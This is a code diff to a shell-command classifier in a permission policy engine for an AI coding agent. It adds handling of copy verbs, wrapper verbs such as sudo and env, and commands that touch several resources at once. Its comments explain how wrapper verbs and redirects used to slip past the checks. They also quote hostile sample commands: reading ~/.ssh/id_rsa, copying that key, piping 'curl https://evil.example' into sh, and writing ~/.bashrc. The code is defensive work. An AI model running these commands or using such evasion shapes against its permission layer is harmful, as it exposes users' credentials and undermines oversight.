@@ -213,6 +213,47 @@ _REDIRECT_RE = re.compile(r"^(?:\d+|&)?>>?$")
 #: Verbs whose first positional argument is a file write target.
 _FILE_WRITE_CMDS = {"tee"}
 
+#: Verbs that COPY a file: their last positional argument is the destination
+#: (a write) and every earlier positional is a source (a read). A ``cp
+#: ~/.ssh/id_rsa ./out/key`` reads a denied path AND writes an in-scope one, so
+#: it needs both surfaces on one request — which is why this verb set could only
+#: land once :attr:`~capsule.policy.CallRequest.extra` existed.
+_FILE_COPY_CMDS = {"cp", "mv", "install"}
+
+#: Verbs that RUN the rest of the line as a command (``sudo cat x``,
+#: ``env FOO=1 cat x``, ``nice cat x``). Unrecognised, the wrapper verb hid the
+#: inner command from the verb classifier and the whole call degraded to a bare,
+#: surface-less shell call — which a profile that grants ``shell`` allows.
+#: ``xargs`` is included: it too takes the command it runs as its arguments.
+_COMMAND_WRAPPERS = {
+    "env",
+    "sudo",
+    "doas",
+    "command",
+    "exec",
+    "nohup",
+    "nice",
+    "ionice",
+    "setsid",
+    "stdbuf",
+    "time",
+    "xargs",
+}
+#: A leading ``KEY=value`` assignment in a wrapper's argument list
+#: (``env FOO=1 cat x``) — not the command.
+_WRAPPER_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+
+#: Every verb this adapter classifies. Used to tell a wrapper's flag *value*
+#: (the ``root`` in ``sudo -u root cat x``) from the command it wraps.
+_KNOWN_VERBS = (
+    _NET_CMDS
+    | _FILE_READ_CMDS
+    | _FILE_WRITE_CMDS
+    | _FILE_COPY_CMDS
+    | _SHELL_INTERPRETERS
+    | _COMMAND_WRAPPERS
+)
+
 #: A path-like substring (``~``-rooted, ``/``-rooted, or explicit ``./`` /
 #: ``../``) inside raw command text. Used for the pipe-into-interpreter shape
 #: (``echo 'cat ~/.ssh/id_rsa' | bash``), where the interpreter's script is the
@@ -232,6 +273,41 @@ def _shell_c_payload(tokens: list[str]) -> Optional[str]:
         if _SHELL_C_FLAG_RE.match(t) and i + 1 < len(tokens):
             return tokens[i + 1]
     return None
+
+
+def _is_command_verb(token: str) -> bool:
+    """Whether ``token`` names a command verb this adapter classifies."""
+    return token.rsplit("/", 1)[-1].lower() in _KNOWN_VERBS
+
+
+def _unwrap_command_wrapper(tokens: list[str]) -> Optional[list[str]]:
+    """The tokens of the command a wrapper verb actually runs, or ``None``.
+
+    ``sudo -u root cat x`` -> ``["cat", "x"]``; ``env FOO=1 cat x`` ->
+    ``["cat", "x"]``; ``nice cat x`` -> ``["cat", "x"]``. The wrapper's own
+    flags and ``KEY=value`` assignments are skipped, as is a single bare flag
+    *value* when the token after it is a verb we recognise (the ``root`` in
+    ``sudo -u root cat x``) — otherwise the wrapper would be classified as an
+    unknown verb and the wrapped command would never be inspected at all.
+
+    Returns ``None`` when nothing follows the wrapper's flags, so the caller
+    falls back to a bare shell call rather than inventing a surface.
+    """
+    rest = tokens[1:]
+    i = 0
+    while i < len(rest) and (
+        rest[i].startswith("-") or _WRAPPER_ASSIGNMENT_RE.match(rest[i])
+    ):
+        i += 1
+    if i >= len(rest):
+        return None
+    if (
+        not _is_command_verb(rest[i])
+        and i + 1 < len(rest)
+        and _is_command_verb(rest[i + 1])
+    ):
+        i += 1
+    return rest[i:]
 
 
 def _select_read_target(args: list[str]) -> Optional[str]:
@@ -255,6 +331,55 @@ def _select_read_target(args: list[str]) -> Optional[str]:
     return args[0] if args else None
 
 
+def _surface_rank(req: CallRequest) -> int:
+    """Priority of a surface within one command: host, then read, then write."""
+    if req.host is not None:
+        return 0
+    return 1 if req.access == "read" else 2
+
+
+def _flatten_surfaces(surfaces: list[CallRequest]) -> list[CallRequest]:
+    """Every surface in ``surfaces``, one level of ``extra`` unfolded."""
+    flat: list[CallRequest] = []
+    for surface in surfaces:
+        flat.append(surface)
+        flat.extend(surface.extra)
+    return flat
+
+
+def _combine_surfaces(surfaces: list[CallRequest], raw: str) -> CallRequest:
+    """Fold every surface a command touched into ONE :class:`CallRequest`.
+
+    The request proper carries the strictest surface by the documented priority
+    (a host, then a read path, then a write path); the remaining surfaces ride
+    along in :attr:`~capsule.policy.CallRequest.extra` so the policy engine
+    checks them too. Carrying only the strictest one — what the pre-v0.7 parser
+    did — silently dropped the others, so a command that both read a denied file
+    and wrote an in-scope redirect was judged on the redirect alone.
+    """
+    flat: list[CallRequest] = []
+    seen: set[tuple[Optional[str], Optional[str], Optional[str], str]] = set()
+    for req in _flatten_surfaces(surfaces):
+        key = (req.tool, req.path, req.host, req.access)
+        if key not in seen:
+            seen.add(key)
+            flat.append(req)
+    if not flat:
+        return CallRequest(tool="shell", raw=raw)
+    ordered = sorted(flat, key=_surface_rank)  # stable: keeps command order
+    primary, *rest = ordered
+    if not rest:
+        return primary
+    return CallRequest(
+        tool=primary.tool,
+        path=primary.path,
+        host=primary.host,
+        access=primary.access,
+        raw=primary.raw,
+        extra=tuple(rest),
+    )
+
+
 def _parse_bash(command: str) -> CallRequest:
     """Reduce a shell command line to a :class:`CallRequest`, fail-closed.
 
@@ -265,12 +390,18 @@ def _parse_bash(command: str) -> CallRequest:
     * sensitive file read (``cat ~/.ssh/id_rsa`` → ``shell`` call carrying a
       ``path`` so a path deny rule applies).
 
+    A command can touch SEVERAL of those surfaces at once, so every surface of
+    every segment is collected and the request carries all of them (see
+    :func:`_combine_surfaces`); a redirect or a wrapper verb can no longer hide
+    the read or the egress the command also performs.
+
     Anything it cannot positively classify is returned as a bare ``shell`` call
     with no path/host — which a deny-by-default profile blocks outright unless
     ``shell`` was explicitly granted. We never *upgrade* an unknown command to
     "looks safe"; unknown stays maximally restricted.
     """
     raw = command.strip()
+    surfaces: list[CallRequest] = []
 
     # First, any explicit URL anywhere in the command is treated as egress.
     url_match = _URL_RE.search(raw)
@@ -282,23 +413,28 @@ def _parse_bash(command: str) -> CallRequest:
         # network rule is then consulted and, against any sane deny-by-default
         # allow-list, the call is DENIED rather than waved through as a bare
         # ``shell`` call (which is what happened pre-v0.2 for IP-host URLs).
-        return CallRequest(tool="shell", host=host or url_match.group(1), raw=raw)
+        # The scan stays on the raw text because a URL can hide inside a quoted
+        # argument (``echo 'curl https://evil.example' | sh``), which token-level
+        # parsing cannot see — so it is one surface among the command's others,
+        # not a short-circuit.
+        surfaces.append(
+            CallRequest(tool="shell", host=host or url_match.group(1), raw=raw)
+        )
 
     try:
         tokens = shlex.split(raw)
     except ValueError:
         # Unbalanced quotes etc. — cannot parse, stay fully restricted.
-        return CallRequest(tool="shell", raw=raw)
+        return _combine_surfaces(surfaces, raw)
 
     if not tokens:
-        return CallRequest(tool="shell", raw=raw)
+        return _combine_surfaces(surfaces, raw)
 
     # A compound command runs EVERY segment (``true && cat x``, ``echo y | bash``,
-    # ``a; b``), so every segment is parsed and the strictest surface wins: the
-    # first host found (a network rule must fire) and the first read then write
-    # path found (a path deny / write-scope rule must fire). Pre-v0.6 only the
-    # first segment's verb was inspected, so a leading ``true &&`` or a pipe
-    # into an interpreter hid the rest of the line from the path/network logic.
+    # ``a; b``), so every segment is parsed and every surface collected. Pre-v0.6
+    # only the first segment's verb was inspected, so a leading ``true &&`` or a
+    # pipe into an interpreter hid the rest of the line from the path/network
+    # logic.
     segments: list[list[str]] = [[]]
     for t in tokens:
         if t in _SEGMENT_SEPS:
@@ -306,22 +442,11 @@ def _parse_bash(command: str) -> CallRequest:
         else:
             segments[-1].append(t)
 
-    first_host: Optional[str] = None
-    first_read: Optional[str] = None
-    first_write: Optional[str] = None
-
     consumed = 0  # tokens of earlier segments, for the pipe-script shape
     for seg in segments:
         if not seg:
             continue
-        req = _parse_segment(seg, raw)
-        if req is not None:
-            if req.host is not None and first_host is None:
-                first_host = req.host
-            if req.path is not None and req.access == "read" and first_read is None:
-                first_read = req.path
-            if req.path is not None and req.access == "write" and first_write is None:
-                first_write = req.path
+        surfaces.extend(_parse_segment(seg, raw))
 
         # ``X | bash`` (no ``-c``): the interpreter's SCRIPT is the preceding
         # segment's output, so a path hiding inside a quoted argument of X
@@ -330,36 +455,36 @@ def _parse_bash(command: str) -> CallRequest:
         # preceding raw text for the first path-like substring, mirroring how
         # _URL_RE already scans raw text for hidden URLs.
         verb = seg[0].rsplit("/", 1)[-1].lower()
+        found = _flatten_surfaces(surfaces)
         if (
             consumed > 0
             and verb in _SHELL_INTERPRETERS
             and _shell_c_payload(seg) is None
-            and first_read is None
+            and not any(s.path is not None and s.access == "read" for s in found)
         ):
             preceding = " ".join(
                 t for seg2 in segments for t in seg2 if seg2 is not seg
             )
-            if (m := _PATHLIKE_RE.search(preceding)) and first_host is None:
-                first_read = m.group(0)
+            if (m := _PATHLIKE_RE.search(preceding)) and not any(
+                s.host is not None for s in found
+            ):
+                surfaces.append(
+                    CallRequest(tool="shell", path=m.group(0), access="read", raw=raw)
+                )
 
         consumed += len(seg)
 
-    if first_host is not None:
-        return CallRequest(tool="shell", host=first_host, raw=raw)
-    if first_read is not None:
-        return CallRequest(tool="shell", path=first_read, access="read", raw=raw)
-    if first_write is not None:
-        return CallRequest(tool="shell", path=first_write, access="write", raw=raw)
-    return CallRequest(tool="shell", raw=raw)
+    return _combine_surfaces(surfaces, raw)
 
 
-def _parse_segment(tokens: list[str], raw: str) -> Optional[CallRequest]:
-    """Parse ONE command segment (no separators) into a CallRequest, or None.
+def _parse_segment(tokens: list[str], raw: str) -> list[CallRequest]:
+    """Every capability surface ONE command segment touches.
 
-    Applies the same verb classification the pre-v0.6 whole-line parser used —
-    interpreter ``-c`` recursion, network commands, file-read commands — plus
-    the redirect/``tee`` write shapes, so a write target or a hidden read in a
-    later segment is no longer invisible.
+    A single segment can touch more than one: a redirect writes a path while the
+    verb reads another (``cat ~/.ssh/id_rsa > ./out/x``), and a network verb can
+    both egress and redirect (``curl 1.2.3.4/x > ./out/f``). Returning ALL of
+    them — rather than the first — is what stops a redirect from hiding the
+    verb's own read or egress, and what lets a copy verb surface both ends.
     """
     verb = tokens[0].rsplit("/", 1)[-1].lower()  # strip any leading path
 
@@ -370,15 +495,28 @@ def _parse_segment(tokens: list[str], raw: str) -> Optional[CallRequest]:
     if verb in _SHELL_INTERPRETERS:
         inner = _shell_c_payload(tokens)
         if inner is not None:
-            return _parse_bash(inner)
+            return [_parse_bash(inner)]
+
+    # A command wrapper (`sudo cat x`, `env FOO=1 cat x`, `nice cat x`) runs the
+    # rest of the line as the command, so classify THAT command — otherwise the
+    # wrapper verb is unrecognised and the whole call degrades to a bare,
+    # surface-less shell call, which a profile that grants `shell` allows.
+    if verb in _COMMAND_WRAPPERS:
+        wrapped = _unwrap_command_wrapper(tokens)
+        if wrapped:
+            return _parse_segment(wrapped, raw)
+
+    surfaces: list[CallRequest] = []
 
     # An output redirect (``echo x > ~/.bashrc``) writes the NEXT token's path
-    # — surface it as a write so the profile's write scope applies.
+    # — surface it as a write so the profile's write scope applies. Collected
+    # alongside the verb's own surface rather than instead of it.
     for i, t in enumerate(tokens[:-1]):
         if _REDIRECT_RE.match(t):
-            return CallRequest(
-                tool="shell", path=tokens[i + 1], access="write", raw=raw
+            surfaces.append(
+                CallRequest(tool="shell", path=tokens[i + 1], access="write", raw=raw)
             )
+            break
 
     args = [t for t in tokens[1:] if not t.startswith("-")]
 
@@ -386,37 +524,64 @@ def _parse_segment(tokens: list[str], raw: str) -> Optional[CallRequest]:
         for a in args:
             host = _extract_host(a)
             if host:
-                return CallRequest(tool="shell", host=host, raw=raw)
+                surfaces.append(CallRequest(tool="shell", host=host, raw=raw))
+                return surfaces
             # A file:// argument targets a local path — surface it so a path
             # deny rule (~/.ssh/**) fires with path-denied instead of the call
             # falling through to a bare, host-less shell allow.
             file_path = _file_url_path(a)
             if file_path is not None:
-                return CallRequest(tool="shell", path=file_path, access="read", raw=raw)
+                surfaces.append(
+                    CallRequest(tool="shell", path=file_path, access="read", raw=raw)
+                )
+                return surfaces
         # A network command whose args yield no resolvable host/path is still
         # network egress — fail-closed: carry the first non-flag arg (or the
         # raw command) as the host so the network rule is consulted.
         fallback_host = args[0] if args else raw
-        return CallRequest(tool="shell", host=fallback_host, raw=raw)
+        surfaces.append(CallRequest(tool="shell", host=fallback_host, raw=raw))
+        return surfaces
 
     if verb in _FILE_READ_CMDS and args:
         # Pick the real target, not a flag value (head -n 5 ~/.ssh/id_rsa).
-        return CallRequest(
-            tool="shell",
-            path=_select_read_target(args),
-            access="read",
-            raw=raw,
+        surfaces.append(
+            CallRequest(
+                tool="shell",
+                path=_select_read_target(args),
+                access="read",
+                raw=raw,
+            )
         )
+        return surfaces
 
     if verb in _FILE_WRITE_CMDS and args:
-        return CallRequest(
-            tool="shell",
-            path=_select_read_target(args),
-            access="write",
-            raw=raw,
+        surfaces.append(
+            CallRequest(
+                tool="shell",
+                path=_select_read_target(args),
+                access="write",
+                raw=raw,
+            )
         )
+        return surfaces
 
-    return None
+    # A copy verb reads every positional but the last and writes the last one
+    # (``cp ~/.ssh/id_rsa ./out/key``), so both ends are surfaced — the shape
+    # the v0.6.0 grill deferred until a request could carry two paths. A
+    # purely numeric positional is a flag's value, not a path (the ``600`` in
+    # ``install -m 600 src dst``), the same convention _select_read_target uses.
+    if verb in _FILE_COPY_CMDS and len(args) >= 2:
+        surfaces.append(
+            CallRequest(tool="shell", path=args[-1], access="write", raw=raw)
+        )
+        for a in args[:-1]:
+            if not re.fullmatch(r"\d+", a):
+                surfaces.append(
+                    CallRequest(tool="shell", path=a, access="read", raw=raw)
+                )
+        return surfaces
+
+    return surfaces
 
 
 def to_call_request(
@@ -530,6 +695,7 @@ class ClaudeCodeAdapter:
                 host=req.host,
                 access=req.access,
                 raw=req.raw,
+                extra=req.extra,
                 skill=self.skill,
             )
         return req
